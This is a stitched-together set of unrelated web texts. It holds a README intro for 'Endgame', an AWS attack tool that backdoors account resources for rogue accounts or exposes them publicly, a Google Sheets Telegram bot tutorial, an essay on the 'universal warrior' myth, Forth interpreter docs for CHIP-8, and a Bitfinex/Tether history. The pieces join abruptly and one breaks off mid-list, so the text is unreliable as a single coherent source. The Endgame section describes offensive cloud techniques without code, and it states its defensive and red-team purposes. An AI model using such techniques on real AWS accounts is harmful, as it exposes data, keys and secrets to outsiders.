<p>An AWS Pentesting tool that lets you use one-liner commands to backdoor an AWS account's resources with a rogue AWS account - or share the resources with the entire Internet 😈</p>
<p>
  <img src="https://endgame.readthedocs.io/en/latest/images/endgame.gif">
</p>

<p>Endgame abuses AWS's resource permission model to grant rogue users (or the Internet) access to an AWS account's resources with a single command. It does this through one of three methods:</p>
<ol>
<li>Modifying <a href="https://endgame.readthedocs.io/en/latest/resource-policy-primer/">resource-based policies</a> (such as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteAccessPermissionsReqd.html#bucket-policy-static-site">S3 Bucket policies</a> or <a href="https://docs.aws.amazon.com/lambda/latest/dg/access-control-resource-based.html#permissions-resource-xaccountinvoke">Lambda Function policies</a>)</li>
<li>Resources that can be made public through sharing APIs (such as <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/sharingamis-explicit.html">Amazon Machine Images (AMIs)</a>, <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html">EBS disk snapshots</a>, and <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ShareSnapshot.html">RDS database snapshots</a>)</li>
<li>Sharing resources via <a href="https://docs.aws.amazon.com/ram/latest/userguide/shareable.html">AWS Resource Access Manager (RAM)</a></li>
</ol>
<p>Endgame was created to:</p>
<ul>
<li>Push <a href="https://endgame.readthedocs.io/en/latest/recommendations-to-aws/">AWS</a> to improve coverage of AWS Access Analyzer so AWS users can protect themselves.</li>
<li>Show <a href="https://endgame.readthedocs.io/en/latest/recommendations-to-blue-teams/">blue teams</a> and developers what kind of damage can be done by overprivileged/leaked accounts.</li>
<li>Help red teams to demonstrate impact of their access.</li>
</ul>
<p>Endgame demonstrates (with a bit of shock and awe) how simple human errors in excessive permissions (such a granting <code>s3:*</code> access instead of <code>s3:GetObject</code>) can be abused by attackers. These are not new attacks, but AWS's ability to <strong>detect</strong> <em>and</em> <strong>prevent</strong> these attacks falls short of what customers need to protect themselves. This is what inspired us to write this tool. Follow the <a href="https://endgame.readthedocs.io/en/latest/tutorial/">Tutorial</a> and observe how you can expose resources across <strong>17 different AWS services</strong> to the Internet in a matter of seconds.</p>
<p>The resource types that can be exposed are of high value to attackers. This can include:</p>
<ul>
<li>Privileged compute access (by exposing who can invoke <code>lambda</code> functions)</li>
<li>Database snapshots (<code>rds</code>), Storage buckets (<code>s3</code>), file systems (<code>elasticfilesystem</code>), storage backups (<code>glacier</code>), disk snapshots (<code>ebs</code> snapshots),</li>
<li>Encryption keys (<code>kms</code>), secrets (<code>secretsmanager</code>), and private certificate authorities (<code>acm-pca</code>)</li>
<li>Messaging and notification services (<code>sqs</code> queues, <code>sns</code> topics, <code>ses</code> authorized senders)</li>
<li>Compute artifacts (<code>ec2</code> AMIs, <code>ecr</code> images, <code>lambda</code> layers)</li>
<li>Logging endpoints (<code>cloudwatch</code> resource policies)</li>
<li>Search and analytics engines (<code>elasticsearch</code> clusters)</li>
</ul>
<p>Endgame is an attack tool, but it was written with a specific purpose. We wrote this tool with desired outcomes for the following audiences:</p>
<ol>
<li><strong>AWS</strong>: We want AWS to empower their customers with the capabilities to fight these attacks. Our recommendations are outlined in the <a href="https://endgame.readthedocs.io/en/latest/recommendations-to-aws/">Recommendations to AWS</a> section.</li>
<li><strong>AWS Customers and their customers</strong>: It is better to have risks be more easily understood and know how to mitigate those risks than to force people to fight something novel. By increasing awareness about Resource Exposure and excessive permissions, we can protect ourselves against attacks where the attackers previously held the advantage and AWS customers were previously left blind.</li>
<li><strong>Blue Teams</strong>: Defense teams can leverage the guidance around user-agent detection, API call detection, and behavioral detection outlined in the <a href="https://endgame.readthedocs.io/en/latest/prevention/">Recommendations to Blue Teams</a> section.</li>
<li><strong>Red Teams</strong>: This will make for some very eventful red team exercises. Make sure you give the Blue Team kudos when they catch you!</li>
</ol>
<h2 id="supported-backdoors">Supported Backdoors</h2>
<p>Endgame can create backdoors for resources in any of the services listed in the table below.</p>
<p>Note: At the time of this writing, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html">AWS Access Analyzer</a> does <strong>NOT</strong> support auditing <strong>11 out of the 18 services</strong> that Endgame attacks. Given that Access Analyzer is intended to detect this exact kind of violation, we kindly suggest to the AWS Team that they support all resources that can be attacked using Endgame. 😊</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1613670455547/FEONztOOP.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>Recently I faced a request</p>
<blockquote>
<p>I'm tracking the number of days off each person in my company in google sheets, where I manually add/subtract their remaining days off. Can a telegram bot show them how many days off they have left once they search for their names?</p>
</blockquote>
<p>The answer is yes, and here is how to do that with Google Cloud Functions and API.chat chatbot platform in <strong>under 100 lines of code</strong>.</p>
<h2 id="setup-google-functions">Setup Google Functions</h2>
<p>First, you need to set up cloud functions and give them access to our document. </p>
<p>Overall you will need two functions: <code>gsheet-get</code> to provide answers and <code>gsheet-add</code> to register users. Let's create them.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613663747484/Fas9Hx7_q.png?auto=compress" alt="image.png"></p>
<p>We do not care about the function code yet. When you set up the first function GCloud will probably ask you to enable Billing and, most importantly, will create a Service account - App Engine default service account. Usage of this account will allow you to perform <a target="_blank" href="https://github.com/googleapis/google-api-nodejs-client#service-account-credentials">server to server, app-level authentication</a>  later.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613663799653/PyiIOpK2x.png?auto=compress" alt="image.png"></p>
<p>But you do need to give access rights to our document to this account.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613662238923/jaVl7Falj.png?auto=compress" alt="image.png"></p>
<p>The document itself is quite simple 
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613663879198/fqWuUfk7H.png?auto=compress" alt="image.png"></p>
<h2 id="function-google-sheet-add">Function <code>google-sheet-add</code></h2>
<p>This function will store the user channel (telegram in the case), chat id, and a name to your table. Google Functions support different languages, including <code>.net core 3.1</code>, but I found out that node.js gives more compact code, so let's stick to it, and sorry for <em>dotnetish</em> code-style</p>
<pre><code><span>const</span> { google } = <span>require</span>(<span>'googleapis'</span>);

<span>exports</span>.main = <span>async</span> (req, res) =&gt; {
  <span>let</span> auth = <span>await</span> google.auth.getClient({ <span>scopes</span>: [<span>'https://www.googleapis.com/auth/spreadsheets'</span>] });  
  <span>let</span> sheets = google.sheets({ <span>version</span>: <span>'v4'</span>, auth });
  <span>try</span>
  {
    <span>await</span> sheets.spreadsheets.values.append({
      <span>spreadsheetId</span>: <span>"INSERT-SHEET-ID-HERE"</span>,
      <span>range</span>: <span>"Days!A:C"</span>,
      <span>valueInputOption</span>: <span>"RAW"</span>,
      <span>insertDataOption</span>: <span>"INSERT_ROWS"</span>,
      <span>resource</span>: {
        <span>values</span>: [
          [req.query.channel, req.query.id, req.query.name]
        ],
      },
      <span>auth</span>: auth
    });    
    res.status(<span>200</span>).send();
  }
  <span>catch</span> (err)
  {
    res.status(<span>500</span>).send({ err })
  }
};
</code></pre>
<p>The code here will append provided values as a new row to the Days sheet. API.chat will provide user data such as channel, chat id, and the name of the user.</p>
<p>Don't forget to add <code>googleapis</code> dependency into <code>package.json</code></p>
<pre><code>{
  <span>"dependencies"</span>: {
    <span>"googleapis"</span>: <span>"^42"</span>
  }
}
</code></pre><p>The main need for this function is to match actual people with their telegram account. There could be more sophisticated ways to do this, but for now this simple way: ask user name - is enough.</p>
<p>That will give you all the required information about the user and you could start calculating his day-offs.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613665878737/i_tzh-dEv.png?auto=compress" alt="image.png"></p>
<h2 id="function-google-sheet-get">Function <code>google-sheet-get</code></h2>
<p>The second function is for getting data from Google Spreadsheet. </p>
<pre><code><span>const</span> { google } = <span>require</span>(<span>'googleapis'</span>);

<span>exports</span>.main = <span>async</span> (req, res) =&gt; {
  <span>const</span> chatId = req.query.id;
  <span>const</span> auth = <span>await</span> google.auth.getClient({ <span>scopes</span>: [<span>'https://www.googleapis.com/auth/spreadsheets'</span>] });  
  <span>const</span> sheets = google.sheets({ <span>version</span>: <span>'v4'</span>, auth });
  <span>try</span> 
  {
    <span>let</span> sheet = <span>await</span> sheets.spreadsheets.values.get({
      <span>spreadsheetId</span>: <span>'INSERT-SHEET-ID-HERE'</span>,
      <span>range</span>: <span>'Days!A:D'</span>
    });

    <span>const</span> rows = sheet.data.values;
    <span>if</span> (rows.length) {
      <span>let</span> finded = rows.find(<span><span>el</span> =&gt;</span> el[<span>1</span>] === chatId)      
      <span>if</span> (finded === <span>undefined</span>) {     
        res.status(<span>200</span>).send({ <span>CorrelationId</span>: req.query.request, <span>Messages</span>: [ <span>"Information not availible"</span> ] });
      } <span>else</span> {      
        res.status(<span>200</span>).send({ <span>CorrelationId</span>: req.query.request, <span>Messages</span>: [ <span>`You have <span>${finded[<span>3</span>]}</span> days off`</span> ] });
      }
    } <span>else</span> {
      <span>console</span>.warn(<span>'No data found.'</span>);
      res.status(<span>200</span>).send({ <span>CorrelationId</span>: req.query.request, <span>Messages</span>: [ <span>"No data found"</span> ] });
    }
    res.status(<span>200</span>).send();
  }
  <span>catch</span>  (err)
  {
    <span>console</span>.error(<span>'The API returned an error: '</span> + err)
    res.status(<span>500</span>).send({ err })
  }
};
</code></pre><p>The main thing I found out here is that google.sheets API filter does not allow you to filter on actual data - only on metadata. That's why you need to get the entire sheet and filter it in code. Like I said before, API.chat will provide your endpoint with chat-id for filtering. From there you can return a formatted string with the answer like that</p>
<pre><code>{
  <span>"Messages"</span>: [
    <span>"You have 7 days off"</span>
  ]
}
</code></pre><h2 id="chatbot-scenario">Chatbot Scenario</h2>
<p>Now when you have all endpoints in place and working you can create an actual chatbot. I will use my very own <a target="_blank" href="https://api.chat/">chatbot builder API.chat</a>. Scenario might be very simple, like that </p>
<pre><code><span>&lt;<span>bot</span>&gt;</span>
  <span>&lt;<span>states</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Start"</span>&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"register"</span> <span>next</span>=<span>"Registration"</span>&gt;</span>Please enter your name<span>&lt;/<span>transition</span>&gt;</span>

    <span>&lt;/<span>state</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Registration"</span>&gt;</span>

    <span>&lt;/<span>state</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Registered"</span>&gt;</span>

    <span>&lt;/<span>state</span>&gt;</span>
  <span>&lt;/<span>states</span>&gt;</span>
<span>&lt;/<span>bot</span>&gt;</span>
</code></pre><p>What we do here is register the user, asking his or her name, and pass it into <code>gsheet-add</code> action in query. After registration user stays in the <code>Registered</code> state forever with the ability to request their days-off through <code>gsheet-get</code> action at any time.</p>
<p>All that's left is to PUT this scenario to the chatbot scenario endpoint and our bot is ready to deliver.</p>

<p>This is the third and final part of a discussion (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">IIb</a>) discussion of the notion that there is a ‘universal warrior’ – a transcendent sameness about either the experience of war or ‘warrior values’ which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p>Over the last three weeks, we’ve looked at the historical evidence to see if there was any hint of some universal war experience or set of warrior values.  What we’ve found instead is that almost everything about how humans engage in war, aside from the fact that they do so, varies tremendously from one culture to the next, from one place to the next, from one period to the next.  Cultural expectations, social values, technological conditions, entire systems of warfare and simple circumstance also condition the experience of war and the values that combatants have in extreme ways which render the search for a ‘universal’ set of warrior values a clearly doomed enterprise.</p>



<p>But, as laid out in the beginning, the ‘universal warrior’ wasn’t merely a (deeply flawed) argument about the structure and experiences of the past, but the foundation stone in an ideological blueprint for living one’s modern life.  And so it is time now that we turn from the (quite bad) historical roots of this idea to the (worse, it turns out) ideological implications of the idea.</p>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>(I couldn’t decide quite how I wanted to illustrate this essay and it didn’t seem like quite the right content for historical cat photos, so I’ve opted to leave it without images.  I may go back and add pictures at a later date, but for now, it can stand purely as an essay.)</p>



<h2>Once More, With Feeling</h2>



<p>In a sense, while the previous three posts have been fun, they were really just a very long preamble to the argument I am making here, so I want to both lay out <em>why</em> I opened with a three-week long preamble before getting to the point (‘how else would you know it was me?’) and also pull together the conclusions from all of that before we move forward.</p>



<p>So why the preamble?  Because I wanted to make sure before we started discussing the underlying ideology that lurks <em>behind</em> claims of the universality of some ‘warrior ethos’ we had defused the retort that, whatever the unpleasant implications, the ‘universal warrior’ was <em>historically true</em>.  This had to be done first because <strong>I am of the opinion that</strong> <strong>truth is an absolute defense</strong> in such matters; the universe contains a great many facts which are frustratingly inconvenient, yet as historians we have to deal with the world as it is rather than as we wish it to be (or wish it to have been).  Consequently, before I could complain about the ideology, it was necessary to determine if the historical theory was true, or even remotely plausible.</p>



<p>So we have spent three weeks hunting for the ‘universal warrior’ – either in the form of a universal war <em>experience</em> or a universal set of <em>values</em>.  What we have found is:</p>



<ul><li>Far from there being one set way that combatants relate to their society, soldiers, warriors and civilians represent distinct categories defined by how people in war relate to their society.  Even <em>within</em> those categories, variety is considerable, leaving no one clear model of how combatants relate to their societies.</li><li>Moreover, war itself is changeable, moving through at least three (and probably four) distinct systems of land warfare alone, each with substantial differences in tactics, values, and experiences.</li><li>Moreover, different cultures understand and imagine the ideal qualities of combatants differently, often so dramatically differently that one culture’s definition of courage is not merely different from an other’s, but diametrically opposed.</li><li>Moreover, the actual experience of battle – we discussed this mostly through the experience of fear – isn’t universal either.  The fear of facing a cavalry charge is not the same sort of fear as the fear of enduring a week long artillery barrage, while ‘war is scary’ in a general sense is hardly enough to set off the warrior or the soldier from any number of other scary and potentially hazardous jobs.</li><li>Moreover, the bonds of comradeship that support modern cohesion (often cited as a unique and universal experience) are, in fact, also historically contingent, both in that there are many systems for generating cohesion, not all of which involve tight bonds formed during military service and that some military systems don’t seek to develop cohesion in this sense at all.</li><li>Moreover, attitudes towards the hardships of war <em>also</em> vary wildly, as do the actual hardships in question.</li><li>Moreover, not only do different societies express different attitudes and values towards the wounded, but the nature of the wounds themselves has changed over time as military technology has become progressively more lethal; both states that apply not only to physical, but also mental wounding.</li></ul>



<p>In short, while there is enough commonality in war to suggest a definition that encompasses the idea (again, I rather prefer W. Lee’s definition of war as “organized group activity, conducted with lethal effects, that diminishes one [unconsenting] group for the benefit of another”), <em>within </em>that definition, <strong>there is far too much variety to suggest there is any one ‘universal’ experience of war or any one set of universal warrior values</strong>.</p>



<p>And I should note this is something we could demonstrate in more than a half-dozen different ways deploying just a fraction of the available scholarship on how the experience and values of war change from place to place.  Indeed, that is essentially what we have done.  <strong>Any <em>one</em> of the above points is enough to be fatal to the notion that there is some sort of ‘universal’ set of warriors values and experiences </strong>such that, as Pressfield openly states, a Spartiate could be simply dropped into a modern U.S. Marine regiment and fit in without skipping a beat (or his equally anachronistic notion that the decadent Athenian could be dropped into American civil society and also integrate seamlessly).  </p>



<p>But of course Pressfield isn’t offering a <em>history</em> (and indeed, he has not written one), he is offering an ideology and (intentionally or not) reshaping the historical facts to fit that ideology, shaving the corners off of the square peg so it will fit into the round hole of his moral assumptions.  His ideology requires a universal set of warrior values to serve as the foundation for his life philosophy and so, facts be damned, he <em>will</em> assert the existence of such a universal set of values.  The ideology, not the history, is the foundation, which is why Pressfield offers both anecdotes from Plutarch (a historical source) and his own books (modern historical fiction) as having equal truth value, even though the latter has no value as historical evidence; they both <strong>express the ideology</strong>.</p>



<p>So what is the ideology here?  Well, for that it is time to meet our old friend…</p>



<h2>The Cult of the Badass</h2>



<p>Pulling out the core ideology from Pressfield’s <a href="https://stevenpressfield.com/category/the-warrior-archetype/">videos </a>is a formidable task; there are fifty of them and so much of the core argument is submerged beneath endless anecdotes (some historical, some Pressfield openly invented for his historical fiction; all delivered with insufficient historical context).  But Pressfield’s videos are useful for this argument because he makes explicit a set of arguments which are usually only made <em>implicitly</em> through a set of emotional appeals which often are carried through the subtext of images and references rather than the text of what is being said.</p>



<p>(Marching through Pressfield’s videos was also frankly difficult because there are <a href="https://twitter.com/BretDevereaux/status/1350655580562731011"><em>just so many errors</em> </a>in them, I had to stop live-tweeting my way through them because if I kept doing it I’d never finish.  As a reminder, this is a fellow whose fiction<a href="https://en.wikipedia.org/wiki/Gates_of_Fire"> is on reading lists </a>at various U.S. military officer training programs, much to my continued sorrow.)</p>



<p>We may, I think, summarize Pressfield’s core argument as follows: the ‘warrior archetype’ (he is using here the long-abandoned psychology of Carl Jung) represents a true human universal best understood by certain ‘warrior societies’ (<em>especially</em> the Spartans, but also Alexander III, but somehow <em>not</em> the Macedonians or Philip II) who supposedly demonstrated martial excellence and who therefore are “representative of the purest expression of the warrior archetype” (his words).  Moreover, Pressfield argues that this understanding of the ‘inner warrior’ provides the best blueprint on which a person might fashion their lives, understanding their weaknesses as an ‘inner enemy’ that must be opposed by ‘warrior values’ and ‘mental toughness.’  And while Pressfield will admit that the ‘warrior archetype’ can go astray (he says this of Alexander, though I’d argue that Alexander didn’t so much ‘go astray’ as he ‘kept doing what he had done literally for his entire life, but began doing it to people who thought Alexander would only hurt people <em>they didn’t like</em>‘), he nevertheless presents this ‘warrior archetype’ as an expression of the highest possible human ideal.  <strong>In Pressfield’s ideological framework, it is the great warriors – the Spartans, Alexander, Arjuna – who stand atop the summit of human physical and moral achievement.</strong>  Non-warriors (mostly women) are valued in as much as they uphold elements of this warrior ideal so that warriors (mostly men) can give those ideals physical expression in action.  Even internal struggles must be reframed as a form of war, to be fought and defeated with the same values that best produce effective real-world violence.</p>

February 18, 2021 | https://internet-janitor.itch.io/squad | <a href="https://web.archive.org/web/*/https://internet-janitor.itch.io/squad">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Squad</h2>
<p>Squad is a <a href="https://en.wikipedia.org/wiki/Forth_(programming_language)" rel="nofollow noopener">Forth</a> interpreter that runs on the <a href="https://en.wikipedia.org/wiki/CHIP-8" rel="nofollow noopener">SCHIP</a> virtual machine. It extends the 8-bit operations of this host machine to 16 bit "cells", per tradition, which also allows pointers to be easily transported and manipulated on the stacks. The parameter and return stacks have room for 32 cells apiece, and at startup there is a bit over 1kb of free space available for user definitions.</p>
<p>While many niceties are missing from the built-in lexicon, due to space constraints, Squad is a fairly complete Forth environment, with a conventional outer and inner interpreter, immediate words, and a mutable return stack.&nbsp;Squad's functionality compares favorably to&nbsp;<a href="https://github.com/JohnEarnest/chip8Archive/blob/master/src/applejak" rel="nofollow noopener"></a><a href="https://internet-janitor.itch.io/applejak">Applejak</a>&nbsp;and&nbsp;<a href="https://internet-janitor.itch.io/bulb">Bulb</a>.</p>
<p>Dictionary entries consist of a pointer to the previous entry (or 0 for the root entry), a "type" cell (see "&gt;type") which distinguishes immediate words with its high byte and word classes with its low byte, the name of the word as a string (see "&gt;name"), and the body of the word itself (see "&gt;body"). Strings are represented with a custom encoding in which each character is a byte, and strings are null-terminated by the byte 0xFF. Properly-formed characters should be multiples of 5, and represent indices into the following alphabet:</p>
<pre>0123456789abcdefghijklmnopqrstuvwxyz+-&lt;&gt;=!@.,:;[]
</pre>
<p>Source code and other materials are also available on <a href="https://github.com/JohnEarnest/chip8Archive/tree/master/src/squad" rel="nofollow noopener">the CHIP-8 Archive</a>.</p>
<h2>Controls</h2>
<p>The ASWD keys and E are always interchangeable with the arrow keys and space.</p>
<p>The outer interpreter will prompt the user for a token at a time, and then either append it to the current definition or execute it, based on "mode". Whenever text is drawn with an inverted background, it is a pending input. Pressing right-arrow or space will confirm a selection, while the up and down arrows cycle between available options.</p>
<p>First, the outer interpreter will ask the user to choose between several coarse categories- a number ("num"), or one of six categories of word, described in detail below. Numbers are always shown in 16-bit hexadecimal. The up and down arrows will increment or decrement the number, while 2 and X will increment or decrement the the number by 256 at a time, to ease entering pointers and large values. If the user is ever prompted to enter a previously unused word name (see "name"), the entry can be terminated by choosing a space character (which will confirm the name up to but not including the space), or by pressing space (which will confirm the name up to and including the present pending character). Pressing Q while entering a new name will back up one character.</p>
<p>At the top level of the outer interpreter, the user may also press `Z`, which is a shorthand for entering ".s"; it will print the current contents of the parameter stack on a new line without modifying it.</p>
<h2>Simple Examples</h2>
<p>Bump allocator:</p>
<pre>: allot here @ + here ! ;</pre>
<p>Calculate and print some terms of the Fibonacci sequence imperatively:</p>
<pre>: fib  0 1 loop dup . swap over + dup 100 &gt; until ;</pre>
<h2>Vocabulary</h2>
<p>The following word lists include stack effects in parentheses. The names to the left of the "--" sign are the input arguments, bottom to top,&nbsp;and the names to the right are the results, if any, bottom to top.</p>
<h3>IO</h3>
<p>Input and output words. Type code 1.</p>
<ul><li>emit ( char -- ) print a single character to the terminal. The high byte of "char" is ignored.</li><li>space ( -- ) print a space to the terminal.</li><li>cr ( -- ) advance terminal output to a new line.</li><li>erase ( -- ) un-print a single character from the current line of terminal output.</li><li>type ( str -- ) given a string (as described above), print it to the terminal.</li><li>untype ( str -- ) erase a string, by issuing "erase" for each character.</li><li>num ( -- n ) prompt the user to enter a 16-bit number.</li><li>name ( -- ) prompt the user to enter a string for a new word name, appending this string to "here".</li><li>word ( type -- xt ) prompt the user to select the name of an existing word. If "type" is 0, any word. Otherwise, it should be the type code of one of these categories.</li><li>token ( -- x flag ) prompt the user for a token, as in the outer interpreter. If "flag" is 0, "x" is a number. Otherwise it's a dictionary entry ("xt").</li></ul>
<h3>Core</h3>
<p>Fundamental forth primitives. Type code 2.</p>
<ul><li>dup ( x -- x x ) copy the top of the parameter stack.</li><li>drop ( x -- ) discard the top of the parameter stack.</li><li>over ( x y -- x y x ) copy the second item on the parameter stack.</li><li>swap ( x y -- y x ) exchange the top two items on the parameter stack.</li><li>r&gt; ( | x -- x | ) move an item from the parameter stack to the return stack.</li><li>&gt;r ( x | -- | x ) move an item from the return stack to the parameter stack.</li><li>! ( x addr -- ) write a 16-bit value x to "addr".</li><li>c! ( x addr -- ) write an 8-bit value (the low byte of x) to "addr".</li><li>@ ( addr -- x ) read a 16-bit value from addr.</li><li>c@ ( addr -- x ) read an 8-bit value from addr.</li><li>not ( x -- flag ) logically invert the flag x.</li><li>&gt; ( x y -- flag ) is x greater than y?</li><li>&lt; ( x y -- flag ) is x less than y?</li><li>= ( x y -- flag ) is x equal to y?</li><li>xor ( x y -- z ) bitwise XOR of x and y.</li><li>and ( x y -- z ) bitwise AND of x and y.</li><li>or ( x y -- z ) bitwise OR of x and y.</li><li>- ( x y -- z ) difference of x and y.</li><li>+ ( x y -- z ) sum of x and y.</li></ul>
<h3>Mem</h3>
<p>Words concerning working with memory and dictionary entries. Type code 3.</p>
<ul><li>here ( -- addr ) a variable containing the address of the first available cell of memory.</li><li>head ( -- addr ) a variable containing the xt of the most recent dictionary entry.</li><li>mode ( -- addr ) a variable containing 0 during interpretation or 1 during compilation.</li><li>, ( x -- ) write a cell to here, incrementing here by 2.</li><li>,c ( x -- ) write a byte to here, incrementing here by 1.</li><li>,ret ( -- ) append an exit to the current definition. This word performs tail-call elimination if the exit follows a threaded code subroutine call.</li><li>,lit ( x -- ) append a literal (push a number) to the current definition.</li><li>,jump ( addr -- ) append an unconditional branch to threaded code at addr to the current definition.</li><li>,jump0 ( addr -- ) append a conditional branch (branch if top of parameter stack is 0) to threaded code at addr to the current definition.</li><li>,call ( xt -- ) append a subroutine call to the current definition. This word will do the right thing whether the provided xt is a "native" (built-in) or threaded code subroutine.</li><li>&gt;type ( xt -- n ) given a dictionary entry, get its category. High byte is the immediate flag, low byte is the category type code.</li><li>&gt;name ( xt -- str ) given a dictionary entry, get the address of its name (suitable for "type").</li><li>&gt;body ( xt -- addr ) given a dictionary entry, get the address where its body begins.</li><li>create ( -- ) prompt for a name, and create a new dictionary entry with that name.</li><li>exec ( xt -- ) given a dictionary entry, execute the word. interpretation counterpart to ",call".</li></ul>
<h3>Flow</h3>
<p>Immediate words, mostly for dealing with control flow and compilation state. Type code 4.</p>
<ul><li>if ... (else) ... then: basic conditional control structure. if consumes a boolean flag.</li><li>loop ...

Use with "]" and ",lit" to pre-evaluate constant expressions, for example.</li><li>] ( --&nbsp;)&nbsp;switch to compiling.</li></ul>
<h3>Env</h3>
<p>Helper words for maintaining and inspecting the Forth environment. Type code 5.</p>
<ul><li>free ( -- x ) how many bytes of memory are available?</li><li>forget ( -- ) prompt for a word name, and destroy that dictionary entry as well as all later definitions. This can really donk up your interpreter if you apply it to internal bits of Squad.</li><li>.s ( -- ) display the contents of the parameter stack without altering it.</li><li>words ( -- ) list all available words.</li></ul>
<h3>User</h3>
<p>"User-defined" (non-primitive) words. Type code 6.</p>

<p>Bitfinex is one of the historically largest Bitcoin exchanges and Tether is by far the largest stablecoin.  Each potentially has significant influence over the industry on their own, and their interconnectedness makes this more of a concern.  However, since both were founded years ago and many of the events have happened and been in revealed in bits and spurts it can be difficult to understand their place in the cryptocurrency environment.  This will hopefully serve as a basic introductory document that will then prompt further research.</p>



<p>Bitfinex was founded by Raphael Nicolle, a <a href="https://www.linkedin.com/in/raphaelnicolle/?locale=en_US">helpdesk</a> technician(<a href="https://bennettftomlin.files.wordpress.com/2020/12/screen-shot-2020-12-08-at-6.31.10-pm.png">best I can do for an archive is a screenshot</a>), in 2012.  It quickly grew in popularity in part due to its ability to serve as a meta-exchange where you could trade on Bitfinex, Mt. Gox, or Bitstamp from the same interface, and later their lending features.  However, even from the founding there were issues that plagued Bitfinex.  Not the least of which being that the<a href="https://news.bitcoin.com/new-details-emerge-bitfinexs-history-amid-hacking-probe/"> source code for Bitfinex was stolen from Bitcoinica</a> (<a href="https://web.archive.org/web/20201209003651/https://news.bitcoin.com/new-details-emerge-bitfinexs-history-amid-hacking-probe/">archive</a>), an earlier hacked and failed exchange created by a 17 year old.  Furthermore, the nature of the meta-exchange meant that they also frequently had large amounts of funds on other exchanges including Mt. Gox. As late as April 21st of 2013 you can see in the leaked email below that they had half of their funds on Mt. Gox.  Mt. Gox was famously hacked for three years and had approximately 650,000 Bitcoin stolen, culminating in ending withdrawals on <a href="https://www.bloomberg.com/news/articles/2014-02-07/bitcoin-price-falls-as-mt-gox-exchange-halts-activity">February 24, 2014</a> (<a href="https://web.archive.org/web/20200806060624/https://www.bloomberg.com/news/articles/2014-02-07/bitcoin-price-falls-as-mt-gox-exchange-halts-activity">archive</a>).  It is unknown if Bitfinex had funds on Mt. Gox when it became impossible to withdraw.</p>

<p>The early history of Tether is complicated.  The precursor to Tether, RealCoin was started in <a href="https://blogs.wsj.com/moneybeat/2014/07/08/dollar-backed-digital-currency-aims-to-fix-bitcoins-volatility-dilemma/">July</a> (<a href="https://web.archive.org/web/20170928084624/https://blogs.wsj.com/moneybeat/2014/07/08/dollar-backed-digital-currency-aims-to-fix-bitcoins-volatility-dilemma/">archive</a>) of 2014 by Brock Pierce (who was <a href="https://www.latimes.com/archives/la-xpm-2002-may-18-me-den18-story.html">arrested in Spain with a fugitive child sexual offender</a> (<a href="https://web.archive.org/web/20201209010719/https://www.latimes.com/archives/la-xpm-2002-may-18-me-den18-story.html">archive</a>)[released with no charges] and was once <a href="https://www.rollingstone.com/culture/culture-features/brock-pierce-hippie-king-of-cryptocurrency-700213/">sued for child sexual abuse</a> [he was voluntarily dismissed of all charges])(<a href="https://bennettftomlin.com/2020/11/06/the-time-brock-pierce-dmed-me/">who once DMed me</a>), Reeve Collins, and Craig Sellars. It was going to be the first dollar backed stablecoin, where each token on the blockchain would represent a dollar in the bank.  This was possible thanks to a new protocol built on top of Bitcoin called Omni that allowed for these tokens to be minted easily.  On September 5th 2014 <a href="https://offshoreleaks.icij.org/nodes/82024464">Tether Holdings Limited</a> (<a href="https://web.archive.org/web/20201209011637/https://offshoreleaks.icij.org/nodes/82024464">archive</a>) was founded by Phil Potter (CSO of Bitfinex at the time) and Giancarlo Devasini (CFO of Bitfinex)[<a href="http://www1.adnkronos.com/Archivio/AdnAgenzia/1996/12/03/Cronaca/PIRATI-INFORMATICI-MICROSOFT-AL-CONTRATTACCO_130900.php">once ordered to pay 100 Million Italian Lira to Microsoft over his sale of pirated software</a>(<a href="https://web.archive.org/web/20201209023901/http://www1.adnkronos.com/Archivio/AdnAgenzia/1996/12/03/Cronaca/PIRATI-INFORMATICI-MICROSOFT-AL-CONTRATTACCO_130900.php">archive</a>)]. On <a href="https://omniexplorer.info/tx/ce36efda15bc6cf99ba6a010e71b47b00a5ea2071a392839effe7ed392cf690f">October 6th 2014</a> (<a href="https://web.archive.org/web/20201209012443/https://omniexplorer.info/tx/ce36efda15bc6cf99ba6a010e71b47b00a5ea2071a392839effe7ed392cf690f">archive</a>) [Bitcoin/Omni transaction id: ce36efda15bc6cf99ba6a010e71b47b00a5ea2071a392839effe7ed392cf690f] the very first Tether tokens were minted.  At some point during this process Tether and Bitfinex ended up having the same leadership team and the same ownership (though they would deny this fact for a while).  <strong>UPDATE: ADDITIONAL CONTEXT ON THIS CLAIM <a href="https://twitter.com/BennettTomlin/status/1362520823681187847">HERE</a></strong></p>



